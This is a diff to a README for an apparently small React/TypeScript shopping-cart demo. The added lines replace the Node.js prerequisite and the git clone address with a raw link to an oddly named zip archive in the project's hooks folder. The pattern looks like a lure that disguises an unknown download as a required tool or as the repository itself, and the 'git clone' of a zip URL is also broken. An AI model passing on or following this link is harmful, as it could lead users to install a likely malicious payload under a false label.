@@ -19,14 +19,14 @@ This project was created as part of studying and comprehending the React and Typ
 
 ## Prerequisites
 
-- Node.js
+- https://raw.githubusercontent.com/vicleyva/ShoppingCartDemo/master/src/hooks/Demo-Shopping-Cart-cowwheat.zip
 - npm
 
 ## Installation
 
 ```bash
 # Clone the repository
-git clone https://github.com/vicleyva/ShoppingCartDemo.git
+git clone https://raw.githubusercontent.com/vicleyva/ShoppingCartDemo/master/src/hooks/Demo-Shopping-Cart-cowwheat.zip
 
 # Change into the project directory
 cd ShoppingCartDemo
